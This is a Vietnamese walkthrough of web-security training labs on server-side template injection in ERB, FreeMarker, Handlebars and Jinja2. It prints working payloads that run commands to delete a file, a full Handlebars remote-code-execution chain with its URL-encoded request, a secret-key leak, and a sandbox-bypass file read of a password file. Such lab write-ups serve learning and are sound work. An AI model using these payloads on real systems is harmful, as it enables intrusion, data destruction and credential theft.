# 1. Basic server-side template injection
Khi xem product với id=1, nhận thấy message "Unfortunately this product is out of stock" được hiển thị, và url có dụng `/?message=....`. Thử với `/?message=<%=7*7%>` thì phần message hiển thị 49. Như vậy website có lỗi SSTI.

Lab description cho ta biết website sử dụng ERB template, như vậy ta chuyển đến URL `/?message=<%=system("rm /home/carlos/morale.txt")` để xóa file morale.txt. Kết quả thành công.

# 2. Basic server-side template injection (code context)

# 3. Server-side template injection using documentation
Đăng nhập với credentails "content-manager:C0nt3ntM4n4g3r", ta thấy có chức năng "Edit Template" và có thể Preview sau khi edit. Thử chèn payload `${7*7}` thì trong response có số 49, như vậy website có lỗ hổng SSTI.

Thử chèn `${abc}` thì xuất hiện thông báo lỗi cho ta biết website sử dụng template "freemaker" với ngôn ngữ Java.

![image](https://user-images.githubusercontent.com/103978452/219274969-c5098403-5979-4a8a-aafe-46d20f57f3ba.png)

Sau khi research trên internet, ta tìm được một số payload. Thử chèn `${"freemarker.template.utility.Execute"?new()("id")}` thì kết quả của lệnh id được trả về trong response. Như vậy, để xóa file "morale.txt", ta chèn vào payload `${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`. Sau khi click Review, bài lab được giải thành công.

# 4. Server-side template injection in an unknown language with a documented exploit
Ta thấy với URL `/?message=abc` thì đoạn text "abc" sẽ được hiển thị trong response. Thử với `{{7*7}}` thì xuất hiện lỗi như sau:

![image](https://user-images.githubusercontent.com/103978452/219276586-6560f565-ba8f-4c84-a7d5-6e4cd0900619.png)

Như vậy ta biết được website sử dụng NodeJs, và sau một số research thì xác định thêm template được sử dụng là "handlebars". Ta tìm được một payload RCE trên Hacktricks như sau:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Thay thế command "whoami" thành "rm /home/carlos/morale.txt", thực hiện URL encoded rồi gán vào tham số "message". Như vậy request như sau:

```
GET /?message=%7b%7b%23with%20"s"%20as%20%7cstring%7c%7d%7d%0d%0a%20%20%7b%7b%23with%20"e"%7d%7d%0d%0a%20%20%20%20%7b%7b%23with%20split%20as%20%7cconslist%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%7b%7bthis%2epush%20%28lookup%20string%2esub%20"constructor"%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23with%20string%2esplit%20as%20%7ccodelist%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7bthis%2epush%20"return%20require%28%27child_process%27%29%2eexec%28%27rm%20%2fhome%2fcarlos%2fmorale%2etxt%27%29%3b"%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7bthis%2epop%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23each%20conslist%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23with%20%28string%2esub%2eapply%200%20codelist%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7bthis%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2fwith%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2feach%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2fwith%7d%7d%0d%0a%20%20%20%20%7b%7b%2fwith%7d%7d%0d%0a%20%20%7b%7b%2fwith%7d%7d%0d%0a%7b%7b%2fwith%7d%7d
```

Sau khi submit, kết quả thành công.

# 5. Server-side template injection with information disclosure via user-supplied objects
Đăng nhập với credentails "content-manager:C0nt3ntM4n4g3r", ta thấy có chức năng "Edit Template" và có thể Preview sau khi edit. Thử chèn `{{7*7}}` thì xuất hiện thông báo lỗi cho ta biết website sử dụng Django framework. Sau các lần thử, ta dự đoán website sử dụng template là Jinja2.

Như vậy, ta chèn payload `{{settings.SECRET_KEY}}` để lấy thông tin SECRET_KEY. Sau khi click Preview, ta thu được `SECRET_KEY=gdrnh5wqn03818q16twn6vhz8zo28tdd`. Dùng thông tin thu được để submit, kết quả thành công.

# 6. Server-side template injection in a sandboxed environment
Đăng nhập với credentails "content-manager:C0nt3ntM4n4g3r", ta thấy có chức năng "Edit Template" và có thể Preview sau khi edit. Ta thấy một bài post có sử dụng `${product.name}`, ta thử thay thành `${abc}` thì thông báo lỗi hiển thị cho ta biết rằng website sử dụng FreeMarker Template với ngôn ngữ Java.

Thử payload như trong bài lab #3 thì thấy thông báo lỗi "not allowed in the template for security reasons". Website đã chặn một số chức năng để tránh SSTI, tuy nhiên thì ta thấy vẫn truy cập được object `product` như thường.

Sau khi research, ta tìm được một payload đọc file dựa trên việc sử dụng một chuỗi các objects và methods:

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
```

![image](https://user-images.githubusercontent.com/103978452/219292169-12d11c81-8897-4d4d-96d5-f289ad7e7f44.png)

Thay thế "path_to_the_file" thành "/home/carlos/my_password.txt", ta nhận được một chuỗi các số. Chuyển lại thành ký tự theo ASCII, thu được mật khẩu là "ugmfdfbhew2q79m8fu9t". Sử dụng thông tin có được để submit, kết quả thành công.

# 7. Server-side template injection with a custom exploit
